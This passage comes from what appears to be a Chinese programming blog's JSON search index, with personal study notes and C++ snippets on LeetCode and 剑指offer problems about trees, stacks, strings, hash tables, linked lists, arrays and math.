还有就是对于只有唯一解的回溯问题，如本题和安排行程，回溯函数的类型应该设置为bool，这样得到一个结果后就能马上返回退出函数。 此题回溯的模样和以前不太一样，因为这是个二维数组，需要进行二维回溯（N皇后也是二维数组但是它每行只选择一个单元，所以以row为单位而无需遍历每个数组单元）","comments":true,"tags":[{"name":"代码随想录","slug":"代码随想录","permalink":"http://yoursite.com/tags/代码随想录/"}]},{"title":"代码随想录-二叉树","date":"2022-07-11T12:04:22.000Z","path":"2022/07/11/代码随想录-二叉树/","text":"包括102. 二叉树的层序遍历，226. 翻转二叉树，101. 对称二叉树，104. 二叉树的最大深度，111. 二叉树的最小深度，222. 完全二叉树的节点个数，110. 平衡二叉树，257. 二叉树的所有路径，404. 左叶子之和，513. 找树左下角的值，112. 路径总和，106. 从中序与后序遍历序列构造二叉树，105. 从前序与中序遍历序列构造二叉树，654. 最大二叉树，617. 合并二叉树，700. 二叉搜索树中的搜索，98. 验证二叉搜索树，530. 二叉搜索树的最小绝对差，501. 二叉搜索树中的众数，236. 二叉树的最近公共祖先，235. 二叉搜索树的最近公共祖先，701. 二叉搜索树中的插入操作，450. 删除二叉搜索树中的节点，669. 修剪二叉搜索树，108. 将有序数组转换为二叉搜索树，538. 把二叉搜索树转换为累加树 102. 二叉树的层序遍历需要分层存储，方法是每处理完一层的节点就记录当前队列的长度，这个长度n就是下一层的节点数，先处理这n个节点（包括取值和加入子节点）。由于限制了处理n个节点，新加入的下一层节点不会被处理。 另外一种方法是先序遍历，因为本题是要把同层的节点放在一起，先序遍历时加一个层数的参数即可，把第k层的节点放入res[k]中，因为先序遍历是先左后右，所以顺序能得到保证 226. 翻转二叉树左右节点交换后向下递归 101. 对称二叉树比较两个节点是否对称有几种情况：1、都为空，2、其中一个为空，3、都不为空且值不相等，4、都不为空且值相等 代码逻辑如下： 1234567if (l == nullptr &amp;&amp; r == nullptr) //1 return true;if (l == nullptr || r == nullptr) //2 return false;if (l-&gt;val != r-&gt;val) //3 return false;return compare(l-&gt;left, r-&gt;right) &amp;&amp; compare(l-&gt;right, r-&gt;left); //4 也可以用层序遍历迭代，入队顺序使要比较的两个节点相邻 104. 二叉树的最大深度递归 111. 二叉树的最小深度和上一题有所不同的是最小深度是以叶节点为终点判断的 如单支树，最小深度不是1而是节点数，遇到空节点不能判断为结束递归 所以递归到空节点时可以返回INT_MAX，保证它不干扰结果 递归到叶节点时才返回1，标志着递归结束 其他情况和上一题类似，max改为min即可 222. 完全二叉树的节点个数1、求树节点数的普适性方法：遍历一次，同时记录节点数 2、利用完全二叉树的特性，如果其子树是满二叉树可用公式2^height - 1直接计算，递归地求每个节点的最左一支和最右一支高度，若相等说明以该节点为根的子树是满二叉树，直接用公式计算不用再向下递归了。若不相等说明有一边有空缺，和法1一样递归左右子树。 110. 平衡二叉树遍历求高度，优化方法是当遍历过程中求得子树不平衡时，返回-1达到剪枝的效果，当返回的lheight或rheight等于-1时整体也不平衡，也向上返回-1。 257. 二叉树的所有路径在遍历中收集路径，遇到叶节点说明这条路径已经完整，否则向下递归。 注意递归函数中路径的类型string path不能加引用，否则会使其他路径的结果传入其他路径。如[1,2,3]，得到1-&gt;2后path仍然是”1-&gt;2”干扰另一条路径变成”1-&gt;2-&gt;3” 若清空path，下一条路径就没有1了。所有不要传引用，拷贝即可，这样返回后不影响当前的path。 404. 左叶子之和遍历，如果一个节点有左孩子且它是叶节点，则加上它的值 513. 找树左下角的值dfs（后序遍历），先算出树的最大深度，递归时标记一个depth参数，最后一个到达max_depth的节点就是左下角，若先序遍历则是第一个到达的节点。 bfs（层序遍历），对每个节点先将右孩子入队再把左孩子入队，这样最后入队的就是左下角的节点 112. 路径总和依然是dfs计算路径和，以叶节点为终点标志 一个技巧是用targetsum向下减的方式可以减少一个参数，累加得到一个sum类型的题目都可以用该技巧。 106. 从中序与后序遍历序列构造二叉树从后序序列找根结点，再定位其在中序序列的位置，左侧序列就是左子树，右侧序列就是右子树，分别对两边递归地构造二叉树 关键是左右子树区间的划分，既要确定它们在中序序列中的位置，又要确定它们在后序序列中的位置，所以需要4个参数确定边界。 中序：左子树 根 右子树 后序：左子树 右子树 根 以左子树序列为例，知道根索引后中序序列的左子树很好确定，左边界是原本的left，右边界是根索引root-1，但后序序列的左子树的右边界无法确实，所以我们需要另外计算一下左子树的长度，即root - left，有了这个值后后序序列左子树的右边界，右子树的左边界都能确定下来。 105. 从前序与中序遍历序列构造二叉树和上题一样，把取后序尾改为取先序头即可。 重温了一下之前做剑指offer时用的哈希表方法，先存储中序序列值和索引的映射关系，这样能快速定位pre元素在in的位置，减少查询。 此方法需要3个参数，分别是pre的左边界即根节点索引，in的左右边界索引。前者用于确定根节点，后者用于确定子树区间 推荐以后使用此方法 654. 最大二叉树类似上两题的思路，这题划分区间更简单，找到最大值索引后左右划分为[left, idx - 1]和[idx + 1, right] 即可。 617. 合并二叉树同时遍历两棵树，一方为空则返回另一方，都为空返回nullptr 根据需要可以在原有的树节点上面修改，节省一些空间但改变了树结构，也可以新建节点。 700. 二叉搜索树中的搜索简单题 98. 验证二叉搜索树1、有关BST的顺序问题，首先要想到中序遍历。因为BST的中序遍历是严格有序的，遍历一次然后判断是否有序即可。 2、在遍历的过程中判断是否有序，可以采用中序遍历，先设定一个最大值，若当前节点值大于最大值，说明有序，把最大值改为当前节点值，否则无序返回false。此方法中的最大值充当了前一节点值的角色。 也可以通过设定边界的方法，先序遍历向左遍历时把右边界设定为当前节点值，向右遍历时把左边界设定为当前节点值。 推荐法2并使用中序遍历 530. 二叉搜索树的最小绝对差中序遍历求差即可。 以前都是记录中序序列再遍历一次，有点浪费空间和时间。这里学一下中序过程中求差的方法，设置一个pre节点记录每个节点的前驱就可以了，处理完当前节点后把当前节点更新的pre。 501. 二叉搜索树中的众数思路和上一题一样，但情况较多 1、频次cnt的更新：若pre为空，将cnt初始化为1；若当前节点值和上一节点值相同，cnt+1；若不同，cnt重新从1开始 2、最大频次cnt的更新：若cnt == max_cnt，当前值也加入res；若cnt &gt; max_cnt，清空原本的res，只放入当前值，并更新max_cnt 236. 二叉树的最近公共祖先剑指做过，这次看了半天又不会…… 判断公共祖先需要知道p、q是否是子节点，也就是需要底层向上反馈信息。此时考虑后序遍历，因为后序遍历就是从子节点到根节点的。 下面代码中left，right起到反馈子节点信息的作用，递归终止条件是遇到null或p、q，所以若left等于null时说明p、q都不在这一侧，此时的right就等于p或q，同时也是最近祖先。若都不等于null，说明p、q分居两侧，这时的root就是要求的最近祖先 123456789if(root == nullptr || root == p || root == q) return root;TreeNode *left = lowestCommonAncestor(root-&gt;left, p, q);TreeNode *right = lowestCommonAncestor(root-&gt;right, p, q);if(left == nullptr) return right;if(right == nullptr) return left;return root; 235. 二叉搜索树的最近公共祖先利用BST有序的特点自顶向下搜索，p、q都大于当前节点值则向右递归，都小于则向左递归，除此之外（其中一个等于当前节点值，或一个大于一个小于当前节点值）都返回当前节点 701. 二叉搜索树中的插入操作根据BST性质向下找到符合的nullptr位置及其父节点，然后插入新节点即可 450. 删除二叉搜索树中的节点首先要明确删除的规则： 1、叶节点，直接删除 2、非叶节点，左孩子非空右孩子为空，删除该节点然后用左孩子代替；右孩子非空则用右孩子代替 3、非叶节点，两个孩子都非空，用右子树最左侧的节点代替 1234567891011121314//前两种情况很好解决，一方为空则返回另一方。没找到要删除的节点则返回null if(root == nullptr) return nullptr; if(root-&gt;right == nullptr) return root-&gt;left; if(root-&gt;left == nullptr) return root-&gt;right;//第三种情况需要找到右子树的最左侧节点，然后把待删除节点的左子树接到它的孩子（原本为空），这样就起到了代替原节点的作用。 TreeNode *cur = root-&gt;right; while(cur-&gt;left != nullptr) &#123; cur = cur-&gt;left; &#125; cur-&gt;left = root-&gt;left; 在主函数中同时找待删除节点和它的父节点，传入待删除节点，将上面返回的结果接到父节点后。 669. 修剪二叉搜索树一开始用上一题的方法做，分别删除节点，还想出了设置哑节点避免单个节点讨论的方法，结果堆报错…… 正如题目说的那样，修剪意味着直接舍弃“一段”树，例如一个节点值比key小，那它左子树的所有值一定也比key小，直接舍弃即可，不用考虑像删除单个节点那样考虑几种情况。 对不在范围内的节点，用递归处理就是节点值小于key就返回右孩子的递归（相当于舍弃了左子树），若大于key就返回左孩子的递归。 对在范围内的节点分别对左右孩子修剪。 108. 将有序数组转换为二叉搜索树不能找中间点然后向两边建树，这样得到的树是^型的，长度大就失衡。 正确的方法是不断地找中间点，每个中间点作为根节点把子树分为均等的两半，这样才能保证不失衡。 538. 把二叉搜索树转换为累加树实质是把节点值从大到小进行累加值传递。由于BST中序遍历有序，利用这个性质就能得到有序序列。需要从大到小则逆中序遍历","comments":true,"tags":[{"name":"代码随想录","slug":"代码随想录","permalink":"http://yoursite.com/tags/代码随想录/"}]},{"title":"代码随想录-栈与队列","date":"2022-07-05T10:39:13.000Z","path":"2022/07/05/代码随想录-栈与队列/","text":"包括232. 用栈实现队列，225. 用队列实现栈，20. 有效的括号，1047. 删除字符串中的所有相邻重复项，150. 逆波兰表达式求值，239. 滑动窗口最大值，347. 前 K 个高频元素 232. 用栈实现队列栈有倒序的作用，使用两个栈即倒序两次就变回顺序，也就是队列 设置一个栈s1接收push，要pop或peek的时候把s1的元素全部放入s2，此时s2出栈顺序就是队列的出队顺序。 225. 用队列实现栈要取出栈顶也就是队尾元素，首先要把其他元素暂存 两个队列，每次push都进入q1，每次pop先把q1除最后一个元素以外的其他元素放入q2，再把该元素出队并返回。然后q1和q2交换 也可以直接用本队列暂存，放到队尾即可，这样需要先记录队列的size而不能动态地使用q.size()，其他处理方法和双队列一样。 20. 有效的括号每个左括号和最近的有括号匹配，因此从左到右遍历，遇到左括号则压栈等待，遇到右括号则检查栈顶是否匹配。匹配则出栈，接着往后检查，不匹配说明是无效括号，因为不能出现类似 ( [ ) ] 的情况，最近的括号对必须是匹配的。 1047. 删除字符串中的所有相邻重复项消除一对相邻重复项可能会导致新的相邻重复项出现，如abba，所以需要保存未消除的元素等待下次检查。栈可以实现该需求，从左向右依次检查是否与栈顶元素相同，是则出栈（消除相同元素），否则入栈。 可以直接使用结果字符串作为栈，减少空间使用 150. 逆波兰表达式求值自己做是按王道书上的双栈方法，处理符号栈时需要判断符号的优先级，很麻烦 其实后缀转中缀就是符号的就近原则，把当前符号用于最近两个数的计算，得到的结果放入待选的数中。原理和上一题消项一样，不过不是消除相同的项，而是在遇到符号时消除栈顶两个数并压入一个新数。 239. 滑动窗口最大值单调队列的经典题目。 维护一个从小到大的单调队列，每次加入元素时先从队尾开始检查，弹出较小的元素保证单调性。另一方面，由于窗口是滑动的，之前的最大值可能已经不在当前窗口了，检查队头是否和左边界前一个元素相同，是的话也弹出 12345678if (i &gt; 0 &amp;&amp; dq.front() == nums[i - 1])//队头&#123; dq.pop_front();&#125;while (!dq.empty() &amp;&amp; dq.back() &lt; nums[j])//队尾&#123; dq.pop_back();&#125; 有单调队列后直接取最大值即可。注意左边界从负数开始，右边界从0开始，这样前k个元素不用预处理。 347. 前 K 个高频元素topk类问题，方法还是维护一个大小为k的堆，也就是优先级队列 本题不是根据大小选，而是元素出现的频次，统计频次当然是用哈希表。 得到频次后如何放入堆中排序呢？堆是根据key值排序的，所以要颠倒哈希表的first和second（使用make_pair），插入堆后根据堆大小和堆顶元素判断是否要插入新元素。 最后堆剩下的元素就是频次最大的k个元素，它们的second就是元素值。","comments":true,"tags":[{"name":"代码随想录","slug":"代码随想录","permalink":"http://yoursite.com/tags/代码随想录/"}]},{"title":"代码随想录-字符串","date":"2022-07-02T10:25:40.000Z","path":"2022/07/02/代码随想录-字符串/","text":"包括344. 反转字符串，541. 反转字符串 II，剑指 Offer 05. 替换空格，151. 颠倒字符串中的单词，剑指 Offer 58 - II. 左旋转字符串，28. 实现 strStr()，459. 重复的子字符串 344. 反转字符串双指针互换即可 541. 反转字符串 II需要分组，这种题目最好固定起点，每轮让起点增加区间的长度（本题为2k），然后在区间内进行相关处理。 此题分两种情况，一是剩余字符串长度小于k，将右边界改为size-1即可；二是剩余字符串大于等于k，将右边界改为left + k - 1即可。至于是否小于2k已经在划分区间时隐含地考虑了。 剑指 Offer 05. 替换空格不用stl，不用额外空间，本题先扩充字符串大小，然后使用双指针从后往前遍历，将原来的字符复制到新的内存空间，遇到空格则添加相应字符。 151. 颠倒字符串中的单词1、从后往前查找单词，记录起点和长度用substr提取并复制到新字符串res中，简单但是需要额外内存 2、字符串/数组前后颠倒类的题，一个常见思路是整体翻转加单独翻转。本题可以先整体reverse，之后对每个单词reverse就能得到结果。 同时参考上题采用双指针去除空格，用idx记录当前字符串的结尾，每找到一个单词后再用一个指针进行从后往前的复制。这样可以O(1)完成复制 剑指 Offer 58 - II. 左旋转字符串左旋不需要额外空间的解法：局部翻转+整体翻转 28. 实现 strStr()kmp算法 将前缀移动到相同的后缀位置上，用j表示前缀的结束位置（另一含义是前缀长度），i表示后缀的结束位置。每次不匹配则通过next数组修改j，直到匹配，随后用前缀长度（也就是j）更新next。 kmp的匹配过程类似，不匹配则找next数组，匹配则下一位 459. 重复的子字符串求next数组，然后根据周期性判断是否重复 字符串匹配问题需要先求next数组，方法如下： 1234567891011121314151617void getNext(int *next, string s)&#123; next[0] = 0; int j = 0; for (int i = 1; i &lt; s.size(); i++) &#123; while (j &gt; 0 &amp;&amp; s[i] != s[j])//不匹配，计算需要移动的位置 &#123; j = next[j - 1]; &#125; if (s[i] == s[j])//匹配，检查下一个字符 &#123; j++; &#125; next[i] = j; &#125;&#125;","comments":true,"tags":[{"name":"代码随想录","slug":"代码随想录","permalink":"http://yoursite.com/tags/代码随想录/"}]},{"title":"代码随想录-哈希表","date":"2022-06-14T10:18:44.000Z","path":"2022/06/14/代码随想录-哈希表/","text":"包括242. 有效的字母异位词，349. 两个数组的交集，202. 快乐数，1. 两数之和，383. 赎金信，15. 三数之和，18. 四数之和，454. 四数相加 II 242. 有效的字母异位词分别统计频次即可，一个字符串加，另一字符串减，看最终频次是否等于0 349. 两个数组的交集用一个set记录第一个数组出现的数，遍历第二个数组在set里找（O(1)复杂度），找到了则加入res中，并且在set里删除该元素，避免重复加入。 202. 快乐数此题重点是找到跳出无限循环的条件，条件就是出现了重复的数，那么求和的过程将不断循环。 所以用一个集合收集每次求和的结果，每次求和后判断set里是否已有该结果，若有说明将无限循环，此时直接返回false 不考虑哈希表，另一种更好的方法是快慢指针。因为此题的本质是判断每位平方求和的操作中是否有环，慢指针每轮求和一次，快指针每轮求和两次。若二者相等说明有环，若fast等于1说明是快乐数。 1. 两数之和看到序号1就懂了 383. 赎金信和字母异位词一样，分别统计，再遍历一次哈希表 15. 三数之和不适合哈希表。解法是每次确定一个数，然后对后续的数进行双指针查找（把查找两个数的复杂度从O(N^2)降为O(N)），为此首先要对nums排序。 查找的过程中要做去重处理，无论是第一个数i的确定还是双指针left和right的确定。方法是判断每次移动后看它和移动前的数是否相同，是则继续移动。 18. 四数之和解法和三数之和完全一样，多套一层for即可。 注意此题不能用nums[i] &gt; target return的优化，因为target未确定，如[-3,-2,3,1,1,11]，target是-4，虽然-3 &gt; -4但后续加上-2就能满足条件。 还有就是本题的样例数值较大，可能出现溢出，不要一次把四个数相加和target比大小，而是求出nums[left] + nums[right] 和 target - (nums[i] + nums[j])比较 n数之和都可以用这种解法（两数之和如果返回值而不是索引也可以），先确定n-2个数，最后用双指针确定最后两个数，把复杂度从O(N^n)降低为O(N^(n-1))。 n数之和的模板如下： 1234567891011121314151617181920212223242526272829303132333435if (nums.size() &lt; n)//元素不足 return &#123;&#125;;sort(nums.begin(), nums.end());for(int i = 0; i &lt; nums.size() - n + 1; i++)//保证后面有n-1个元素&#123; if(i &gt; 0 &amp;&amp; nums[i] == nums[i - 1])//nums[i]去重 continue; //如果四数之和就加一重for，n每多1就多一重for //for(int i = 0; i &lt; nums.size() - n + 2; i++) // ...... int left = i + 1; int right = nums.size() - 1; while (left &lt; right)//双指针部分（固定写法） &#123; int sum = nums[left] + nums[right]; if (sum &lt; target - nums[i]) &#123; left++; &#125; else if (sum &gt; target - nums[i]) &#123; right--; &#125; else &#123; res.push_back(&#123;nums[i], nums[left], nums[right]&#125;); left++; right--; while (left &lt; right &amp;&amp; nums[left] == nums[left - 1])//nums[left]去重 left++; while (left &lt; right &amp;&amp; nums[right] == nums[right + 1])//nums[right]去重 right--; &#125; &#125; &#125; 454. 四数相加 II穷举的复杂度为O(N^4)，考虑空间换时间用哈希表先存一些结果，避免查找时从头遍历。方法是分组求和 先把nums1和nums2的数求和并放入哈希表，value值为出现次数 再求nums3和nums4的和，通过查哈希表找需要的另一半结果，这样使时间复杂度减小为了O(N^2)。 类似的n数相加都可以用这种方法把复杂度降为O(N^(n/2))","comments":true,"tags":[{"name":"代码随想录","slug":"代码随想录","permalink":"http://yoursite.com/tags/代码随想录/"}]},{"title":"代码随想录-链表","date":"2022-06-13T08:00:43.000Z","path":"2022/06/13/代码随想录-链表/","text":"包括203. 移除链表元素，707. 设计链表，206.反转链表，24. 两两交换链表中的节点，19. 删除链表的倒数第 N 个结点，面试题 02.07. 链表相交，142. 环形链表 II 203. 移除链表元素此题的技巧主要是通过设置哑节点避免特殊情况的讨论 val匹配则进行删除，val不匹配则指针后移 也可以用递归，但费空间 707. 设计链表完整地实现了一个链表，设置哑节点、维护链表长度可以使增删操作简单很多。 206.反转链表典中典，第一次还写错了… 采用头插法，设置3个指针，分别指向新链表头节点，当前节点，当前节点的下一节点。每次把当前节点连到新头节点上，然后指针移动。 也可以从后往前翻转，递归能便捷地完成，维护前一节点和当前节点，每次把当前节点指向前一节点。递归从后往前执行，所以保证了不会断链。 24. 两两交换链表中的节点模拟该过程即可，但注意交换指针无法交换节点，需要更改相应的next才行，每次翻转涉及三个节点：待翻转的first和second以及first的前一个节点pre。 为了避免空和单个节点的讨论，引入哑节点，pre初始化就是哑节点 为了避免最后一组为空的讨论，用pre-&gt;next和pre-&gt;next-&gt;next判断是否结束，每次翻转完后移动pre即可。 19. 删除链表的倒数第 N 个结点经典快慢指针应用，fast先走n步，fast和slow再同步直到fast到链尾。 此题需删除节点，故slow应走到倒数第n个节点前面，方法是fast多走一步，这样slow就能少走一步。 面试题 02.07. 链表相交双指针，先走长度差值再同步。 或者更巧的做法是从（对方）的头再来，但注意该方法的指针要走到nullptr，也就是根据curA == nullptr 来判断是否从头再来，这样把nullptr当作一般节点即使没找到也会返回nullptr（它被当作了公共节点），无需额外讨论。 142. 环形链表 II算法课讲过，快慢指针找环，无环则返回nullptr，有环则把一个指针回到起点，然后两个指针同步直到相遇。","comments":true,"tags":[{"name":"代码随想录","slug":"代码随想录","permalink":"http://yoursite.com/tags/代码随想录/"}]},{"title":"代码随想录-数组","date":"2022-06-12T10:24:42.000Z","path":"2022/06/12/代码随想录-数组/","text":"包括704. 二分查找，35. 搜索插入位置，34. 在排序数组中查找元素的第一个和最后一个位置，27. 移除元素，977. 有序数组的平方，209. 长度最小的子数组，904. 水果成篮，76. 最小覆盖子串，59. 螺旋矩阵 II 704. 二分查找二分查找的两种写法： 1、若target在[left, right]之间，应该写while (left &lt;= right) ，带等号因为能取到左右区间，相等有意义，同样right = mid - 1 2、若target在[left, right)之间，左右区间不会相等，应该写while (left &lt; right)，同样由于右区间不会取到，更新时写right = mid，否则mid - 1将被排除。 总结：二分查找区间的开闭决定了while是否取等号，以及左右区间的更新。注意mid = left + ((right - left) &gt;&gt; 1)不要漏了后半部分的括号 35. 搜索插入位置采用第一种写法，当left = right时做最后一次判断，此时mid = left =right，若nums[mid] &gt; target，right - 1导致right &lt; left跳出while，我们应该在mid前面插入新元素，即插入后的索引就是当前的left nums[mid] &gt; target，left + 1导致right &lt; left跳出while，我们应该在mid后面插入新元素，也就是目前的left 故查找成功返回mid，查找不成功时返回left即可。 34. 在排序数组中查找元素的第一个和最后一个位置很经典的题目，用二分法查找左右边界 1、找左边界时，当nums[mid] == target 应该更新右边界，因为我们要找左边界，右边界要尽可能收缩。最后的left就是要找的值 2、找右边界同理，相等时更新左边界，最后得到right。 注意相等时边界的更新方式：左边界更新right，右边界更新left，以及最终边界值的确定：左边界选left，右边界选right。 有序数组的高效查找问题，考虑二分法 27. 移除元素1、不考虑元素相对顺序：相向的指针，用后面的元素代替要删除的元素 2、考虑元素的相对顺序：快慢指针，快指针不停移动一位，慢指针找要移除的元素，找到后停在原地等待快指针移动到非val的元素。替代慢指针的元素后二者再次同时后移。 977. 有序数组的平方为了满足非递减的顺序，一开始从中间找，略显复杂。 其实nums长度已知，开一个同样长度的vector从后往前添加即可。 相向指针比较大小，大的一方放入res并移动。 数组的元素两两比较，考虑双指针 209. 长度最小的子数组关于子数组和的问题，一般考虑滑动窗口。 右边界右移，直到子数组和满足题目要求，得到一个长度后让左边界右移，从新的起点开始找子数组。最终判断得到最小的长度 注意左边界右移可能需要多次，用while而不是if。 904. 水果成篮两种元素的最长连续子序列，同样滑动窗口。 用左边界确定一个元素，右边界滑动并记录子序列长度，直到遇到新的元素左边界收缩，更换确定好的元素。 问题是确定选择的是哪两个元素？我们不仅要确定其种类，也要知道它们出现的次数（次数减为0才能移除），所有应该使用哈希表，建立元素和次数的对应关系。 76. 最小覆盖子串很容易看出使用滑动窗口，和上题类似，但此题匹配串有多个字符，所以要事先建立哈希表统计每个字符出现的次数。 类似地，在字符串中滑动窗口，我们使用substr得到子串，所以需要知道子串的起点和长度。右边界每次滑动一位，在计数表中让对应的项-1，然后查看该子串是否符合题意（即计数表每一项都&lt;0），若符合则开始收缩左边界，收缩时让计数表相应的项+1，再次检查是否符合题意并不断重复此过程。 数组的一次遍历，通常用滑动窗口 通过以上3题可以总结出滑动窗口的模板： 1234567891011while (right &lt; nums.size()) //以右边界为准 &#123; while (已满足题意，继续寻找更好的结果) &#123; res = min(res, len); left++; //左边界收缩 len--; &#125; len++ right++; //右边界扩张 &#125; 59. 螺旋矩阵 II模拟类的题目，螺旋矩阵问题的关键是边界的处理 螺旋矩阵I（给定矩阵顺时针输出）：从一个边界到另一个边界，处理完一条边后收缩该边界，退出条件是边界重合 螺旋矩阵II（给定大小返回矩阵）：从一个边界到另一个边界，处理完一条边后收缩该边界，退出条件是处理完需要的数 数组的场景模拟","comments":true,"tags":[{"name":"代码随想录","slug":"代码随想录","permalink":"http://yoursite.com/tags/代码随想录/"}]},{"title":"剑指 Offer. 模拟","date":"2022-05-09T08:28:45.000Z","path":"2022/05/09/剑指offer-模拟/","text":"模拟，包括29. 顺时针打印矩阵，31. 栈的压入、弹出序列 剑指 Offer 29. 顺时针打印矩阵输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字。 1 2 3 4 5 6 7 8 9 输出 [1,2,3,6,9,8,7,4,5] 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/shun-shi-zhen-da-yin-ju-zhen-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解重复右、下、左、上四个方向的运动，麻烦在于边界的判断以及是否重复读入 一个简化方法是压缩边界，按行遍历，完事后就可以忽略这一行了，即把边界+1或-1向内压缩 设置四个值指示矩阵的四个边界： int left = 0, right = matrix[0].size() - 1;int up = 0, down = matrix.size() - 1; 例如，首先读取第一行，到达右边界right后停止，然后把上边界up+1 其他三个方向同理 123456789101112131415161718while(1)&#123; for(int i = left; i &lt;= right; ++i)//向右 res.push_back(matrix[up][i]); if(++up &gt; down) //压缩边界并检查是否已没有元素 break; for(int i = up; i &lt;= down; ++i)//向下 res.push_back(matrix[i][right]); if(--right &lt; left) break; for(int i = right; i &gt;= left; --i)//向左 res.push_back(matrix[down][i]); if(--down &lt; up) break; for(int i = down; i &gt;= up; --i)//向上 res.push_back(matrix[i][left]); if(++left &gt; right) break;&#125; 复杂度遍历一遍矩阵，时间复杂度O(MN)，空间复杂度O(1) 易错点结束的条件是左边界越过右边界，上边界越过下边界，因为边界重合时说明只有一个数。 每次读完一行就要检查结束，否则越界后下一次读取将出错。 剑指 Offer 31. 栈的压入、弹出序列输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如，序列 {1,2,3,4,5} 是某栈的压栈序列，序列 {4,5,3,2,1} 是该压栈序列对应的一个弹出序列，但 {4,3,5,1,2} 就不可能是该压栈序列的弹出序列。 输入：pushed = [1,2,3,4,5], popped = [4,5,3,2,1]输出：true解释：我们可以按以下顺序执行：push(1), push(2), push(3), push(4), pop() -&gt; 4,push(5), pop() -&gt; 5, pop() -&gt; 3, pop() -&gt; 2, pop() -&gt; 1 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/zhan-de-ya-ru-dan-chu-xu-lie-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解用一个栈模拟题目过程，栈顶元素和poped[i]相同时出栈，不同时从pushed入栈。 可以用i和j分别指向pushed和poped的当前元素，但需要判断pushed的边界以及栈是否为空，有点麻烦。 更为简便的写法是用迭代器遍历pushed（避免了边界判断），用while直接把所有匹配的栈顶出栈，然后无需判断直接向栈中加入pushed的一个元素。 这样写把所有pushed都入栈，若序列符合顺序，即能和poped匹配上，最终会全部出栈，若不匹配则最终栈非空。 1234567for(int n : pushed)&#123; st.push(n); while(!st.empty() &amp;&amp; st.top() == popped[i])&#123; st.pop(); ++i; &#125;&#125; 复杂度时间复杂度O(n)，空间复杂度O(n) 易错点pop[i++]不是赋值语句，不等于pop[i]，i++，它等于pop[i+1] 因此这两句不能复合写。 另外可以把pushed当栈使用实现O(1)空间复杂度，额外设置一个指针i模拟堆顶指针即可。 12345678910 int i = 0, j = 0; for(int n : pushed)&#123; pushed[i] = n; while(i &gt;= 0 &amp;&amp; pushed[i] == popped[j])&#123; ++j; --i; &#125; ++i; &#125;return i == 0;","comments":true,"tags":[{"name":"剑指offer","slug":"剑指offer","permalink":"http://yoursite.com/tags/剑指offer/"}]},{"title":"剑指 Offer. 数学","date":"2022-05-07T12:20:49.000Z","path":"2022/05/07/剑指offer-数学/","text":"数学，包括39. 数组中出现次数超过一半的数字，66. 构建乘积数组，14- I. 剪绳子，57 - II. 和为s的连续正数序列，62. 圆圈中最后剩下的数字，14- II. 剪绳子 II，43. 1～n 整数中 1 出现的次数，44. 数字序列中某一位的数字 剑指 Offer 39. 数组中出现次数超过一半的数字数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。 你可以假设数组是非空的，并且给定的数组总是存在多数元素。 输入: [1, 2, 3, 2, 2, 2, 5, 4, 2]输出: 2 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shu-zu-zhong-chu-xian-ci-shu-chao-guo-yi-ban-de-shu-zi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、第一想法是用哈希表记录每个元素的次数，找出次数大于nums长度一半的数即可缺点是需要额外的空间 2、另一种方法和很好想，排序后取中位数，但不够快。 3、解决众数问题一种快速的方法是摩尔投票，它采取一种相互抵消的策略：若一个数出现次数超过一半，即超过其他数的次数和，那它和其他数一一抵消后剩下的数一定也还是这个数。 设置一个计数器，和一个当前数major，遍历nums，若是major，cnt加1，否则减1，若cnt归0说明一一抵消，切换major。最后的major就是众数。 12345678910for(int i = 1; i &lt; nums.size(); ++i)&#123; if(nums[i] == major) ++cnt; else --cnt; if(cnt == 0)&#123; //切换major，重新计数 cnt = 1; major = nums[i]; &#125;&#125; 复杂度1、时间复杂度O(n)，空间复杂度O(n) 2、时间复杂度O(nlogn)，空间复杂度O(1) 3、时间复杂度O(n)，空间复杂度O(1) 剑指 Offer 66. 构建乘积数组给定一个数组 A[0,1,…,n-1]，请构建一个数组 B[0,1,…,n-1]，其中 B[i] 的值是数组 A 中除了下标 i 以外的元素的积, 即 B[i]=A[0]×A[1]×…×A[i-1]×A[i+1]×…×A[n-1]。不能使用除法。 输入: [1,2,3,4,5]输出: [120,60,40,30,24] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/gou-jian-cheng-ji-shu-zu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、暴力计算左右乘积，包含大量重复计算，超时 2、可以先用数组存储每个位置左/右元素的乘积，如left[i]表示i这个位置左边元素的乘积，right[i]表示右边元素的乘积，b[i] = left[i] * right[i] 对left，有left[i] = left[i - 1] * a[i - 1]，即上一次的乘积乘上一个数，left[0] = 1 对right，有right[i] = right[i + 1] * a[i + 1]，right[len - 1] = 1 此方法需要两个额外的数组，可以把结果数组b当left使用，之后的right无需另外储存，与b的值相乘后存放即可。 12345678for(int i = 1; i &lt; a.size(); ++i)&#123; //i左侧元素乘积 b[i] = b[i - 1] * a[i - 1]; &#125;int temp = 1;for(int i = a.size() - 1; i &gt;= 0; --i)&#123; b[i] *= temp; //左右侧的乘积 temp *= a[i]; //i右侧元素的乘积&#125; 复杂度时间复杂度O(n)，空间复杂度O(1) 剑指 Offer 14- I. 剪绳子给你一根长度为 n 的绳子，请把绳子剪成整数长度的 m 段（m、n都是整数，n&gt;1并且m&gt;1），每段绳子的长度记为 k[0],k[1]…k[m-1] 。请问 k[0]k[1]…*k[m-1] 可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。 输入: 10输出: 36解释: 10 = 3 + 3 + 4, 3 × 3 × 4 = 36 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/jian-sheng-zi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、剪成长为3的是最优解，数学证明见lc题解。于是尽可能地剪成3。 2、每次剪绳子能否得到更大的乘积，取决于剪完后小段绳子的结果，一个问题可以分解为多个相似的子问题，用动态规划。 对长为i的绳子，剪去j，若继续往下剪，乘积为 j dp[i - j]，若不继续剪，乘积为j (i - j) 于是有状态转移方程 dp[i] = 